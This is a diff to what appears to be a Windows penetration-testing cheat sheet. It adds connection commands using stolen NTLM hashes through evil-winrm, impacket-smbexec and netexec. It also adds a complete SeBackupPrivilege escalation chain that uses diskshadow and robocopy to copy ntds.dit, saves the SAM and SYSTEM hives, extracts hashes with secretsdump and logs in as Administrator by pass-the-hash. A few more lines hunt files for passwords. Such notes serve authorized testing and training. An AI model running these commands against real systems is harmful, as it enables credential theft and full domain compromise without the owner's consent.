@@ -1,5 +1,11 @@
 # Windows
 
+## Connection
+
+ - RDP: `xfreerdp /v:<IP> /u:<USER> /p:<PASSWORD> /drive:linux,/tmp`
+ - If user is member of Remote Management group: `evil-winrm `
+ - With the hash NTLM hash from secretsdump ou mimikatz: `impacket-smbexec -hashes 'NT:LM' domain/user@ip` or `netexec smb -d domain -H nt:lm -u user -x cmd ip`
+
 ## Enumeration
 
  - `systeminfo`
@@ -47,6 +53,23 @@ run
  - `LaZagne all`
  - `SharpUp audit`
  - `snaffler -s -o result.log -i C:`
+
+## When user has privs SeBackupPrivilege
+
+```
+whoami /priv
+SeBackupPrivilege
+
+$test="set verbose on `nset metadata C:\Windows\Temp\meta.cab `nset context clientaccessible `nset context persistent `nbegin backup `nadd volume C: alias cdrive `ncreate `nexpose %cdrive% E: `nend backup `n"
+$test | Set-Content save.txt
+diskshadow.Exe /s save.txt
+robocopy /b E:\Windows\ntds . ntds.dit
+reg save HKLM\SAM sam.save
+reg save HKLM\SYSTEM system.save
+impacket-secretsdump -system system.save -sam sam.save -ntds ntds.dit local
+Administrator:500:NT:LM:::
+evil-winrm --hash LM -i 10.10.10.10 --user Administrator
+```
  
 ## When system
 
@@ -85,6 +108,7 @@ c:\dir NT SERVICE\TrustedInstaller:(F)
 
 ### Creds
 
+ - snaffler : `snaffler -s -o result.log -i c:\`
  - Search for a string: `findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml unattend.xml`, `select-string -Path *.txt -Pattern password`
  - Search for a file: `dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*`, `where /R C:\ *.config`, `Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore`
  - IIS configuration file: C:\inetpub\wwwroot\web.config
